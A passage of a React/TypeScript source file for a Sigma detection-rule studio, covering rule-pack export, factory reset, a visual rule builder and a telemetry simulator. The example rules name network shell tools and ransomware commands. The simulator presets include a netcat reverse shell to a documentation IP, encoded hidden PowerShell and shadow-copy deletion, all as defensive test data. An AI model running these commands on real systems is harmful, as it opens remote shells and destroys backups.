      <div className="rounded-xl border border-border-subtle bg-bg-surface p-5">
        <p className="text-xs leading-relaxed text-text-muted">
          Export the whole operational rule surface — tuning overrides, suppressions, per-OS enumeration tables, FP
          threshold — as one JSON document, and re-apply it any time. Keep exports in git: diff what changed between
          rule revisions, and roll back by re-importing an earlier export. Import applies tuning as a full sync,
          suppressions additively (never clobbers live triage), and enum tables + threshold wholesale.
        </p>
        <div className="mt-4 flex flex-wrap items-center gap-2">
          <button
            onClick={() => void doExport()}
            className="press inline-flex items-center gap-1.5 rounded-lg border border-accent/50 bg-accent/10 px-3 py-2 font-mono text-xs font-medium text-accent transition-all duration-150 hover:shadow-[var(--glow-accent)]"
          >
            <Icon name="download" size={12} />
            Export pack (JSON)
          </button>
          <button
            onClick={() => void doExportSigma()}
            className="press inline-flex items-center gap-1.5 rounded-lg border border-cyan-500/50 bg-cyan-500/10 px-3 py-2 font-mono text-xs font-medium text-cyan-400 transition-all duration-150 hover:bg-cyan-500/20"
            title="Download multi-document Sigma YAML bundle for Splunk / Elastic / Sentinel"
          >
            <Icon name="terminal" size={12} />
            Export Sigma Ruleset (.yml)
          </button>
          <button
            onClick={() => fileRef.current?.click()}
            className="press inline-flex items-center gap-1.5 rounded-lg border border-border-subtle px-3 py-2 font-mono text-xs text-text-muted transition-colors duration-150 hover:border-accent/60 hover:text-accent"
          >
            <Icon name="download" size={12} className="rotate-180" />
            Import pack (JSON)
          </button>
          <input
            ref={fileRef}
            type="file"
            accept=".json,application/json"
            className="hidden"
            onChange={(e) => {
              const f = e.target.files?.[0];
              if (f) void doImport(f);
              e.target.value = "";
            }}
          />
          <button
            onClick={() => sigmaFileRef.current?.click()}
            className="press inline-flex items-center gap-1.5 rounded-lg border border-border-subtle px-3 py-2 font-mono text-xs text-text-muted transition-colors duration-150 hover:border-cyan-400 hover:text-cyan-400"
            title="Import single or multi-document SigmaHQ YAML rulepack (.yml / .yaml)"
          >
            <Icon name="download" size={12} className="rotate-180 text-cyan-400" />
            Import Sigma (.yml)
          </button>
          <input
            ref={sigmaFileRef}
            type="file"
            accept=".yml,.yaml,text/yaml"
            className="hidden"
            onChange={(e) => {
              const f = e.target.files?.[0];
              if (f) void doImportSigma(f);
              e.target.value = "";
            }}
          />
        </div>
        {packMsg && <p className="mt-3 font-mono text-[11px] leading-relaxed text-risk-clean">{packMsg}</p>}
        {packErr && <p className="mt-3 font-mono text-[11px] leading-relaxed text-risk-malicious">{packErr}</p>}
      </div>
    </div>
  );
}

function FactoryResetPanel() {
  const queryClient = useQueryClient();
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [err, setErr] = useState<string | null>(null);

  const doReset = async () => {
    const ok = window.confirm(
      "Factory-reset the rule surface? This clears EVERY tuning override, suppression, and " +
        "pattern-table edit — enumeration, anti-forensics, and the FP threshold — back to stock. " +
        "Run triage state (alert statuses, allowlists) is untouched. This cannot be undone (export a rule pack first).",
    );
    if (!ok) return;
    setBusy(true);
    setErr(null);
    try {
      const r = await resetRules();
      setMsg(
        `Reset to stock — ${r.tuning_cleared} tuning override(s), ${r.suppressions_cleared} suppression(s), ` +
          `${r.settings_cleared} pattern/threshold key(s) cleared.`,
      );
      for (const key of [["tuning"], ["rule-fp"], ["enum-patterns"], ["log-patterns"], ["suppressions"]]) {
        void queryClient.invalidateQueries({ queryKey: key });
      }
    } catch {
      setErr("Reset failed — is the backend running?");
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="mt-8">
      <div className="mb-2">
        <p className="kicker">Operations · danger zone</p>
        <h2 className="mt-1 text-base font-semibold text-text-primary">Factory reset rules</h2>
      </div>
      <div className="flex flex-wrap items-center gap-3 rounded-lg border border-risk-malicious/30 bg-bg-surface p-4">
        <p className="min-w-0 flex-1 text-xs leading-relaxed text-text-muted">
          Clear every tuning override, suppression, and pattern-table edit (enumeration + anti-forensics + FP
          threshold) back to the engine&apos;s stock behavior — a single consolidated transaction, audited. Export a rule pack first if
          you might want the current surface back.
        </p>
        <button
          onClick={() => void doReset()}
          disabled={busy}
          className="press shrink-0 rounded border border-risk-malicious/60 px-3 py-1.5 font-mono text-xs text-risk-malicious transition-colors duration-150 hover:bg-risk-malicious/10 disabled:cursor-not-allowed disabled:opacity-50"
        >
          {busy ? "Resetting…" : "Factory reset"}
        </button>
        {msg && <p className="w-full font-mono text-[11px] leading-relaxed text-risk-clean">{msg}</p>}
        {err && <p className="w-full font-mono text-[11px] leading-relaxed text-risk-malicious">{err}</p>}
      </div>
    </div>
  );
}


function SigmaDetectionStudio({
  onOpenBacktest,
}: {
  onOpenBacktest: (rule: { id?: string; name: string; customYaml?: string }) => void;
}) {
  const queryClient = useQueryClient();
  const [searchParams] = useSearchParams();
  const [yaml, setYaml] = useState("");
  const [selectedRuleId, setSelectedRuleId] = useState<string | null>(null);
  const [result, setResult] = useState<any | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [imported, setImported] = useState(false);
  const [showCatalog, setShowCatalog] = useState(false);
  const [actionNotice, setActionNotice] = useState<string | null>(null);

  // Authoring Mode: Visual Rule Builder vs Raw Sigma YAML Editor
  const [authorMode, setAuthorMode] = useState<"builder" | "yaml">("builder");

  // Visual Rule Builder State
  const [builderTitle, setBuilderTitle] = useState("Custom Suspicious Tool Execution");
  const [builderDesc, setBuilderDesc] = useState("Detects suspicious process execution patterns and commands");
  const [builderLevel, setBuilderLevel] = useState("high");
  const [builderPlatform, setBuilderPlatform] = useState("linux");
  const [builderCategory, setBuilderCategory] = useState("process_creation");
  const [builderTactic, setBuilderTactic] = useState("execution");
  const [builderTechnique, setBuilderTechnique] = useState("T1059");
  const [builderCriteria, setBuilderCriteria] = useState<Array<{ field: string; modifier: string; value: string }>>([
    { field: "CommandLine", modifier: "contains", value: "nc -e, netcat -e, /bin/bash -i" },
  ]);
  const [builderExclusions, setBuilderExclusions] = useState<Array<{ field: string; modifier: string; value: string }>>([
    { field: "CommandLine", modifier: "contains", value: "benign_healthcheck" },
  ]);

  // Validation Console State: Simulator vs Historical Backtest
  const [validationTab, setValidationTab] = useState<"simulator" | "backtest">("simulator");

  // Telemetry Simulator State
  const [simEvent, setSimEvent] = useState({
    process_name: "nc",
    command_line: "nc -e /bin/bash 198.51.100.25 4444",
    dest_ip: "198.51.100.25",
    dest_port: "4444",
    file_path: "",
    user: "root",
    platform: "linux",
  });
  const [simResult, setSimResult] = useState<RuleSimulationResult | null>(null);
  const [simRunning, setSimRunning] = useState(false);
  const [simError, setSimError] = useState<string | null>(null);

  const [triggerRunning, setTriggerRunning] = useState(false);
  const [triggerResult, setTriggerResult] = useState<RuleTriggerTestResult | null>(null);
  const [triggerError, setTriggerError] = useState<string | null>(null);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") setShowCatalog(false);
    };
    if (showCatalog) window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [showCatalog]);

  // Search and filter state for left catalog rail
  const [searchFilter, setSearchFilter] = useState("");
  const [tacticFilter, setTacticFilter] = useState("all");
  const [severityFilter, setSeverityFilter] = useState("all");
  const [statusFilter, setStatusFilter] = useState<"all" | "active" | "disabled">("all");

  // Inline backtest state in IDE
  const [backtestWindow, setBacktestWindow] = useState<number>(2000);
  const [backtestRunning, setBacktestRunning] = useState<boolean>(false);
  const [backtestResult, setBacktestResult] = useState<RuleBacktestResult | null>(null);
  const [backtestError, setBacktestError] = useState<string | null>(null);

  const { data: communityRules } = useQuery({
    queryKey: ["sigma-community"],
    queryFn: getCommunitySigmaRules,
  });

  const { data: customRules, refetch: refetchCustom } = useQuery({
    queryKey: ["sigma-custom"],
    queryFn: getCustomSigmaRules,
  });

  const importMutation = useMutation({
    mutationFn: (ruleYaml: string) => importSigmaRule(ruleYaml, true),
    onSuccess: () => {
      setImported(true);
      void queryClient.invalidateQueries({ queryKey: ["sigma-custom"] });
      setActionNotice("Rule deployed and active in live detection engine");
      setTimeout(() => {
        setImported(false);
        setActionNotice(null);
      }, 3000);
    },
  });

  const toggleMutation = useMutation({
    mutationFn: ({ ruleId, enabled }: { ruleId: string; enabled: boolean }) =>
      patchCustomSigmaRule(ruleId, { enabled }),
    onSuccess: () => {
      void refetchCustom();
      setActionNotice("Rule evaluation status updated");
      setTimeout(() => setActionNotice(null), 2500);
    },
  });

  const deleteMutation = useMutation({
    mutationFn: (ruleId: string) => deleteCustomSigmaRule(ruleId),
    onSuccess: () => {
      void refetchCustom();
      setSelectedRuleId(null);
      setYaml("");
      setResult(null);
      setBacktestResult(null);
      setSimResult(null);
      setTriggerResult(null);
      setActionNotice("Rule removed from engine registry");
      setTimeout(() => setActionNotice(null), 2500);
    },
  });

  // Helper to compile Visual Builder into canonical Sigma YAML
  const syncBuilderToYaml = (): string => {
    const tags = [`attack.${builderTactic}`, `attack.${builderTechnique.toLowerCase().trim()}`];
    const selection: Record<string, string[]> = {};
    builderCriteria.forEach((c) => {
      if (!c.field.trim() || !c.value.trim()) return;
      const key = c.modifier && c.modifier !== "contains" ? `${c.field}|${c.modifier}` : c.field;
      const vals = c.value.split(",").map((v) => v.trim()).filter(Boolean);
      selection[key] = vals.length > 0 ? vals : [c.value.trim()];
    });

    const filter: Record<string, string[]> = {};
    builderExclusions.forEach((c) => {
      if (!c.field.trim() || !c.value.trim()) return;
      const key = c.modifier && c.modifier !== "contains" ? `${c.field}|${c.modifier}` : c.field;
      const vals = c.value.split(",").map((v) => v.trim()).filter(Boolean);
      filter[key] = vals.length > 0 ? vals : [c.value.trim()];
    });

    const lines = [
      `title: ${builderTitle || "Custom Detection Rule"}`,
      `id: custom-${Date.now().toString(16)}`,
      `status: experimental`,
      `description: ${builderDesc || "Custom operator-authored detection rule"}`,
      `level: ${builderLevel}`,
      `tags:`,
      ...tags.map((t) => `  - ${t}`),
      `logsource:`,
      builderPlatform !== "all" ? `  product: ${builderPlatform}` : null,
      builderCategory ? `  category: ${builderCategory}` : null,
      `detection:`,
      `  selection:`,
    ].filter(Boolean) as string[];

    Object.entries(selection).forEach(([k, vals]) => {
      lines.push(`    ${k}:`);
      vals.forEach((v) => lines.push(`      - '${v}'`));
    });

    if (Object.keys(filter).length > 0) {
      lines.push(`  filter:`);
      Object.entries(filter).forEach(([k, vals]) => {
        lines.push(`    ${k}:`);
        vals.forEach((v) => lines.push(`      - '${v}'`));
      });
      lines.push(`  condition: selection and not filter`);
    } else {
      lines.push(`  condition: selection`);
    }

    const generated = lines.join("\n") + "\n";
    setYaml(generated);
    return generated;
  };

  // Auto-initialize when redirected from MITRE coverage gap or deep-linked rule_id
  useEffect(() => {
    const tacticParam = searchParams.get("tactic");
    const ruleIdParam = searchParams.get("rule_id");

    if (ruleIdParam && customRules && customRules.length > 0) {
      const match = customRules.find((r: any) => r.rule_id === ruleIdParam);
      if (match) {
        setSelectedRuleId(match.rule_id);
        if (match.sigma_yaml) setYaml(match.sigma_yaml);
        return;
      }
    }

    if (searchParams.get("create") === "1" && tacticParam && !yaml) {
      const sanitized = tacticParam.toLowerCase().replace(/[^a-z0-9]+/g, "_");
      setBuilderTactic(sanitized);
      setBuilderTitle(`Custom Rule for ${tacticParam}`);
      setYaml(`title: Custom Rule for ${tacticParam}
id: e2b08fa1-custom-${Date.now().toString(16)}
status: experimental
description: Custom detection rule covering MITRE ATT&CK tactic ${tacticParam}
level: medium
tags:
  - attack.${sanitized}
detection:
  selection:
    CommandLine|contains:
      - 'suspicious_command'
  condition: selection
`);
    } else if (!yaml && customRules && customRules.length > 0 && !selectedRuleId) {
      const first = customRules[0];
      setSelectedRuleId(first.rule_id);
      if (first.sigma_yaml) setYaml(first.sigma_yaml);
    }
  }, [searchParams, customRules]);

  const loadExample = (type: "windows" | "linux" | "macos" | "c2" | "ransomware" = "windows") => {
    setSelectedRuleId(null);
    setResult(null);
    setBacktestResult(null);
    setSimResult(null);
    setTriggerResult(null);
    if (type === "linux") {
      setBuilderTitle("Linux Base64 Pipe Execution");
      setBuilderLevel("high");
      setBuilderPlatform("linux");
      setBuilderTactic("execution");
      setBuilderTechnique("T1059.004");
      setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "base64 -d | sh, base64 -d | bash" }]);
      setYaml(`title: Linux Base64 Pipe Execution
id: e2b08fa1-0002-4000-8000-000000000002
status: experimental
description: Detects base64 decoded payloads piped directly into sh/bash
level: high
tags:
  - attack.execution
  - attack.t1059.004
detection:
  selection:
    CommandLine|contains:
      - 'base64 -d | sh'
      - 'base64 -d | bash'
      - 'base64 --decode | bash'
  condition: selection
`);
    } else if (type === "macos") {
      setBuilderTitle("macOS LaunchDaemon Persistence");
      setBuilderLevel("medium");
      setBuilderPlatform("macos");
      setBuilderTactic("persistence");
      setBuilderTechnique("T1543.001");
      setBuilderCriteria([{ field: "TargetFilename", modifier: "startswith", value: "/Library/LaunchDaemons/, /Library/LaunchAgents/" }]);
      setYaml(`title: macOS LaunchDaemon Persistence
id: e2b08fa1-0003-4000-8000-000000000003
status: experimental
description: Detects creation or modification of launch daemons on macOS
level: medium
tags:
  - attack.persistence
  - attack.t1543.001
detection:
  selection:
    TargetFilename|startswith:
      - '/Library/LaunchDaemons/'
      - '/Library/LaunchAgents/'
  condition: selection
`);
    } else if (type === "c2") {
      setBuilderTitle("Direct External IP Socket Connection");
      setBuilderLevel("high");
      setBuilderPlatform("all");
      setBuilderTactic("command_and_control");
      setBuilderTechnique("T1071");
      setBuilderCriteria([{ field: "DestinationIp", modifier: "contains", value: "198.51.100., 203.0.113." }]);
      setYaml(`title: Direct External IP Socket Connection
id: e2b08fa1-0004-4000-8000-000000000004
status: experimental
description: Detects processes initiating direct outbound connections to suspicious external C2 IPs
level: high
tags:
  - attack.command_and_control
  - attack.t1071
detection:
  selection:
    dest_ip|contains:
      - '198.51.100.'
      - '203.0.113.'
  condition: selection
`);
    } else if (type === "ransomware") {
      setBuilderTitle("Ransomware Shadow Copy Invalidation");
      setBuilderLevel("critical");
      setBuilderPlatform("windows");
      setBuilderTactic("impact");
      setBuilderTechnique("T1490");
      setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "vssadmin delete shadows, shadowcopy delete" }]);
      setYaml(`title: Ransomware Shadow Copy Invalidation
id: e2b08fa1-0005-4000-8000-000000000005
status: experimental
description: Detects attempts to delete volume shadow copies using vssadmin or wmic
level: critical
tags:
  - attack.impact
  - attack.t1490
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'resize shadowstorage'
      - 'shadowcopy delete'
  condition: selection
`);
    } else {
      setBuilderTitle("Suspicious PowerShell Download C2");
      setBuilderLevel("high");
      setBuilderPlatform("windows");
      setBuilderTactic("execution");
      setBuilderTechnique("T1059.001");
      setBuilderCriteria([
        { field: "Image", modifier: "endswith", value: "powershell.exe" },
        { field: "CommandLine", modifier: "contains", value: "DownloadFile, DownloadString, IEX" },
      ]);
      setYaml(`title: Suspicious PowerShell Download C2
id: e2b08fa1-1234-5678-abcd-000000000000
status: experimental
description: Detects PowerShell downloading and staging binary payloads
level: high
tags:
  - attack.execution
  - attack.t1059.001
detection:
  selection:
    Image|endswith: 'powershell.exe'
    CommandLine|contains:
      - 'DownloadFile'
      - 'DownloadString'
      - 'IEX'
  condition: selection
`);
    }
    setError(null);
  };

  const handleTranspile = async () => {
    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
    if (!activeYaml.trim()) return;
    setError(null);
    setResult(null);
    setBusy(true);
    try {
      const res = await transpileSigmaRule(activeYaml);
      setResult(res);
    } catch (e: any) {
      setError(e?.message || "Transpilation failed");
    } finally {
      setBusy(false);
    }
  };

  const handleDeploy = () => {
    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
    if (!activeYaml.trim()) return;
    importMutation.mutate(activeYaml);
  };

  const handleSelectCommunityRule = (r: any) => {
    setSelectedRuleId(null);
    setYaml(r.sigma_yaml);
    setAuthorMode("yaml");
    setShowCatalog(false);
    setError(null);
    setResult(null);
    setBacktestResult(null);
    setSimResult(null);
    setTriggerResult(null);
  };

  const handleRunInlineBacktest = async () => {
    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
    if (!activeYaml.trim()) return;
    setBacktestRunning(true);
    setBacktestError(null);
    try {
      const res = await backtestCustomRule({ sigma_yaml: activeYaml, max_events: backtestWindow });
      setBacktestResult(res);
    } catch (err: any) {
      setBacktestError(err?.message || "Historical backtest query failed");
    } finally {
      setBacktestRunning(false);
    }
  };

  const handleRunSimulation = async () => {
    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
    if (!activeYaml.trim()) return;
    setSimRunning(true);
    setSimError(null);
    setSimResult(null);
    try {
      const res = await simulateCustomRule({
        sigma_yaml: activeYaml,
        event: {
          ...simEvent,
          dest_port: simEvent.dest_port ? Number(simEvent.dest_port) : undefined,
        },
      });
      setSimResult(res);
    } catch (err: any) {
      setSimError(err?.message || "Simulation evaluation failed");
    } finally {
      setSimRunning(false);
    }
  };

  const handleFireLiveTest = async () => {
    const activeYaml = authorMode === "builder" ? syncBuilderToYaml() : yaml;
    if (!activeYaml.trim()) return;
    setTriggerRunning(true);
    setTriggerError(null);
    setTriggerResult(null);
    try {
      const res = await triggerLiveRuleTest({
        sigma_yaml: activeYaml,
        event: {
          ...simEvent,
          dest_port: simEvent.dest_port ? Number(simEvent.dest_port) : undefined,
        },
        sample_name: builderTitle || "rule_verification_test",
      });
      setTriggerResult(res);
      setActionNotice(`Live test fired! Alert #${res.alert_id ?? "live"} registered.`);
      void refetchCustom();
    } catch (err: any) {
      setTriggerError(err?.message || "Live test trigger failed");
    } finally {
      setTriggerRunning(false);
    }
  };

  const loadSimPreset = (preset: "netcat" | "powershell" | "shadows" | "c2" | "benign") => {
    setSimResult(null);
    setTriggerResult(null);
    if (preset === "netcat") {
      setSimEvent({
        process_name: "nc",
        command_line: "nc -e /bin/bash 198.51.100.25 4444",
        dest_ip: "198.51.100.25",
        dest_port: "4444",
        file_path: "",
        user: "root",
        platform: "linux",
      });
    } else if (preset === "powershell") {
      setSimEvent({
        process_name: "powershell.exe",
        command_line: "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        dest_ip: "198.51.100.77",
        dest_port: "443",
        file_path: "",
        user: "SYSTEM",
        platform: "windows",
      });
    } else if (preset === "shadows") {
      setSimEvent({
        process_name: "vssadmin.exe",
        command_line: "vssadmin delete shadows /all /quiet",
        dest_ip: "",
        dest_port: "",
        file_path: "C:\\Windows\\System32\\vssadmin.exe",
        user: "Administrator",
        platform: "windows",
      });
    } else if (preset === "c2") {
      setSimEvent({
        process_name: "curl",
        command_line: "curl http://198.51.100.44:4444/beacon -o /dev/null",
        dest_ip: "198.51.100.44",
        dest_port: "4444",
        file_path: "",
        user: "www-data",
        platform: "linux",
      });
    } else {
      setSimEvent({
        process_name: "ping",
        command_line: "ping -c 4 8.8.8.8",
        dest_ip: "8.8.8.8",
        dest_port: "",
        file_path: "/bin/ping",
        user: "operator",
        platform: "linux",
      });
    }
  };

  // Filter rules for left catalog rail
  const filteredRules = (customRules ?? []).filter((rule: any) => {
    if (statusFilter === "active" && !rule.enabled) return false;
    if (statusFilter === "disabled" && rule.enabled) return false;
    if (severityFilter !== "all" && rule.level !== severityFilter) return false;
    if (tacticFilter !== "all") {
      const hasTactic = (rule.mitre_tactics || []).some((t: string) =>
        t.toLowerCase().includes(tacticFilter.toLowerCase())
      );
      if (!hasTactic) return false;
    }
    if (searchFilter.trim()) {
      const q = searchFilter.toLowerCase().trim();
      const matchTitle = (rule.title || "").toLowerCase().includes(q);
      const matchId = (rule.rule_id || "").toLowerCase().includes(q);
      const matchDesc = (rule.description || "").toLowerCase().includes(q);
      const matchTactics = (rule.mitre_tactics || []).some((t: string) => t.toLowerCase().includes(q));
      if (!matchTitle && !matchId && !matchDesc && !matchTactics) return false;
    }
    return true;
  });

  const activeRule = (customRules ?? []).find((r: any) => r.rule_id === selectedRuleId);

  return (
    <div className="mt-6 space-y-4 font-mono text-xs">
      {actionNotice && (
        <div className="flex items-center justify-between rounded-xl border border-signal/50 bg-signal/15 px-4 py-2 font-mono text-xs text-signal animate-fade-in">
          <span>✓ {actionNotice}</span>
          <button onClick={() => setActionNotice(null)} className="text-text-muted hover:text-text-primary">✕</button>
        </div>
      )}

      {/* SigmaHQ Catalog Drawer */}
      {showCatalog && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label="SigmaHQ Community Rule Catalog"
          className="fixed inset-0 z-50 flex justify-end bg-black/60 backdrop-blur-xs transition-opacity animate-fade-in"
          onClick={() => setShowCatalog(false)}
        >
          <div
            className="flex h-full w-full max-w-2xl flex-col border-l border-border-subtle bg-bg-surface shadow-2xl animate-slide-in overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between border-b border-border-subtle px-6 py-4 bg-bg-base/70">
              <div>
                <h3 className="font-bold text-text-primary text-sm">SigmaHQ Community Rule Catalog</h3>
                <p className="text-[11px] text-text-muted">Pre-validated detection signatures for Windows, Linux, and macOS</p>
              </div>
              <button
                onClick={() => setShowCatalog(false)}
                className="text-text-muted hover:text-text-primary text-sm p-1 rounded hover:bg-bg-base"
              >
                ✕
              </button>
            </div>

            <div className="flex-1 overflow-y-auto p-6 space-y-2.5">
              {(communityRules ?? []).map((r) => (
                <div
                  key={r.id}
                  className="rounded-lg border border-border-subtle bg-bg-base/60 p-3 hover:border-accent/40 transition"
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="font-bold text-text-primary">{r.title}</span>
                    <div className="flex items-center gap-1 text-[10px]">
                      <span className="rounded bg-bg-surface border border-border-subtle px-1.5 py-0.2 text-text-muted uppercase">
                        {r.platform}
                      </span>
                      <span className={`rounded px-1.5 py-0.2 font-bold uppercase ${
                        r.level === "critical"
                          ? "bg-risk-malicious/20 text-risk-malicious"
                          : r.level === "high"
                            ? "bg-risk-suspicious/20 text-risk-suspicious"
                            : "bg-accent/15 text-accent"
                      }`}>
                        {r.level}
                      </span>
                    </div>
                  </div>
                  <p className="mt-1 text-[11px] text-text-muted truncate">{r.description}</p>
                  <div className="mt-2 flex items-center justify-between">
                    <div className="flex gap-1">
                      {r.mitre_techniques.map((t) => (
                        <span key={t} className="rounded bg-accent/10 px-1 py-0.2 text-[10px] text-accent">
                          {t}
                        </span>
                      ))}
                    </div>
                    <button
                      onClick={() => handleSelectCommunityRule(r)}
                      className="press rounded border border-accent/60 bg-accent/10 px-2 py-0.5 text-[11px] font-semibold text-accent hover:bg-accent/20"
                    >
                      Clone into IDE →
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Split-View Detection Workbench: Left Catalog Rail + Right IDE Surface */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-start">
        {/* Left Column: Rule Catalog Rail (4 cols) */}
        <div className="lg:col-span-4 rounded-xl border border-border-subtle bg-bg-surface p-3.5 space-y-3">
          {/* Top Rail Controls */}
          <div className="flex items-center justify-between border-b border-border-subtle/60 pb-2.5">
            <div className="flex items-center gap-2">
              <span className="font-bold text-text-primary text-xs">Rule Catalog</span>
              <span className="rounded-full bg-bg-base border border-border-subtle px-2 py-0.2 text-[10px] text-text-muted">
                {(customRules ?? []).length} Deployed
              </span>
            </div>
            <div className="flex items-center gap-1.5">
              <button
                onClick={() => {
                  setSelectedRuleId(null);
                  setAuthorMode("builder");
                  setBuilderTitle("New Detection Rule");
                  setBuilderCriteria([{ field: "CommandLine", modifier: "contains", value: "" }]);
                  setBuilderExclusions([]);
                  loadExample("linux");
                }}
                className="press rounded border border-accent/50 bg-accent/15 px-2 py-0.5 text-[10px] font-bold text-accent hover:bg-accent/25"
                title="Author a new custom Sigma rule from scratch"
              >
                + New
              </button>
              <button
                onClick={() => setShowCatalog(true)}
                className="press rounded border border-border-subtle bg-bg-base px-2 py-0.5 text-[10px] text-text-muted hover:border-accent/40 hover:text-text-primary"
                title="Browse SigmaHQ Community Catalog"
              >
                SigmaHQ
              </button>
            </div>
          </div>

          {/* Search Box */}
          <div className="relative">
            <Icon name="search" size={12} className="pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-text-faint" />
            <input
              type="text"
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              placeholder="Filter by title, ID, tactic..."
              className="w-full rounded-lg border border-border-subtle bg-bg-base py-1.5 pl-7 pr-2.5 text-xs text-text-primary placeholder:text-text-faint focus:border-accent/60 focus:outline-none"
            />
          </div>

          {/* Filter Pills */}
          <div className="flex flex-wrap items-center gap-1 text-[10px]">
            <button
              onClick={() => setStatusFilter(statusFilter === "all" ? "active" : statusFilter === "active" ? "disabled" : "all")}
              className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-text-primary"
            >
              Status: <span className="font-bold text-text-primary capitalize">{statusFilter}</span>
            </button>
            <button
              onClick={() => {
                const tactics = ["all", "execution", "persistence", "defense_evasion", "command_and_control"];
                const nextIdx = (tactics.indexOf(tacticFilter) + 1) % tactics.length;
                setTacticFilter(tactics[nextIdx]);
              }}
              className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-text-primary"
            >
              Tactic: <span className="font-bold text-text-primary capitalize">{tacticFilter}</span>
            </button>
            <button
              onClick={() => {
                const sevs = ["all", "critical", "high", "medium"];
                const nextIdx = (sevs.indexOf(severityFilter) + 1) % sevs.length;
                setSeverityFilter(sevs[nextIdx]);
              }}
              className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-text-primary"
            >
              Sev: <span className="font-bold text-text-primary capitalize">{severityFilter}</span>
            </button>
          </div>

          {/* Rules List */}
          <div className="max-h-[580px] overflow-y-auto space-y-1.5 pr-1 divide-y divide-border-subtle/30">
            {filteredRules.length === 0 ? (
              <p className="py-8 text-center text-[11px] text-text-muted">
                No rules match the current filters.
              </p>
            ) : (
              filteredRules.map((rule: any) => {
                const isSelected = selectedRuleId === rule.rule_id;
                return (
                  <div
                    key={rule.rule_id}
                    onClick={() => {
                      setSelectedRuleId(rule.rule_id);
                      if (rule.sigma_yaml) setYaml(rule.sigma_yaml);
                      setAuthorMode("yaml");
                      setResult(null);
                      setBacktestResult(null);
                      setSimResult(null);
                      setTriggerResult(null);
                    }}
                    className={`cursor-pointer rounded-lg p-2.5 transition pt-2 ${
                      isSelected
                        ? "border border-accent/60 bg-accent/10 shadow-xs"
                        : "border border-transparent hover:bg-bg-base/70"
                    }`}
                  >
                    <div className="flex items-center justify-between gap-1.5">
                      <div className="flex items-center gap-1.5 min-w-0">
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            toggleMutation.mutate({ ruleId: rule.rule_id, enabled: !rule.enabled });
                          }}
                          className={`press flex h-4 w-4 shrink-0 items-center justify-center rounded border font-mono text-[9px] font-bold ${
                            rule.enabled
                              ? "border-signal/60 bg-signal/20 text-signal"
                              : "border-border-subtle bg-bg-base text-text-faint"
                          }`}
                          title={rule.enabled ? "Rule is Active (Click to Disable)" : "Rule is Disabled (Click to Enable)"}
                        >
                          {rule.enabled ? "✓" : "○"}
                        </button>
                        <span className={`font-bold truncate text-xs ${isSelected ? "text-accent" : "text-text-primary"}`}>
                          {rule.title}
                        </span>
                      </div>
                      <span className={`rounded px-1.5 py-0.2 text-[9px] uppercase font-bold shrink-0 ${
                        rule.level === "critical"
                          ? "bg-risk-malicious/20 text-risk-malicious"
                          : rule.level === "high"
                            ? "bg-risk-suspicious/20 text-risk-suspicious"
                            : "bg-accent/15 text-accent"
                      }`}>
                        {rule.level || "med"}
                      </span>
                    </div>

                    <div className="mt-1.5 flex items-center justify-between text-[10px] text-text-faint">
                      <div className="flex items-center gap-1 truncate">
                        {(rule.mitre_tactics || []).slice(0, 2).map((t: string) => (
                          <span key={t} className="rounded bg-bg-base border border-border-subtle px-1 py-0.1">
                            {t}
                          </span>
                        ))}
                      </div>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          if (window.confirm(`Delete rule "${rule.title}"?`)) {
                            deleteMutation.mutate(rule.rule_id);
                          }
                        }}
                        className="press text-text-faint hover:text-risk-malicious p-0.5"
                        title="Delete rule"
                      >
                        <Icon name="x" size={10} />
                      </button>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* Right Column: Detection IDE & Validation Studio (8 cols) */}
        <div className="lg:col-span-8 space-y-4">
          {/* Main Authoring Deck */}
          <div className="rounded-xl border border-border-subtle bg-bg-surface overflow-hidden shadow-xs">
            {/* Toolbar Header */}
            <div className="border-b border-border-subtle bg-bg-elevated/40 p-3 flex flex-wrap items-center justify-between gap-2.5">
              <div className="flex items-center gap-3">
                {/* Authoring Mode Switcher */}
                <div className="flex items-center rounded-lg border border-border-subtle bg-bg-base p-0.5">
                  <button
                    type="button"
                    onClick={() => setAuthorMode("builder")}
                    className={`press rounded px-2.5 py-1 text-[11px] font-bold transition flex items-center gap-1.5 ${
                      authorMode === "builder"
                        ? "bg-accent/20 border border-accent/60 text-accent shadow-xs"
                        : "text-text-muted hover:text-text-primary"
                    }`}
                  >
                    <Icon name="sliders" size={11} />
                    <span>Visual Rule Builder</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      if (authorMode === "builder") syncBuilderToYaml();
                      setAuthorMode("yaml");
                    }}
                    className={`press rounded px-2.5 py-1 text-[11px] font-bold transition flex items-center gap-1.5 ${
                      authorMode === "yaml"
                        ? "bg-accent/20 border border-accent/60 text-accent shadow-xs"
                        : "text-text-muted hover:text-text-primary"
                    }`}
                  >
